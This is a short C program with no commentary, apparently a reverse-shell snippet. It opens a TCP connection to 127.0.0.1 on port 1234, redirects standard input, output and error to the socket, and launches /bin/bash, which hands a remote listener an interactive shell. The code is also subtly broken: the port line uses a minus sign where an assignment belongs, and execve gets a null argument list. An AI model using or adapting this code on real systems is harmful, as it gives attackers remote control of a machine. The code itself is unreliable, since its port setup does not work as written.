
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
  struct sockaddr_in sock_addr;

  sock_addr.sin_family = AF_INET;
  sock_addr.sin_port - htons(1234);
  sock_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  
  connect(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
  
  for (int i = 0; i <= 2; i++)
    dup2(sockfd, i);

  execve("/bin/bash", NULL, NULL);
}
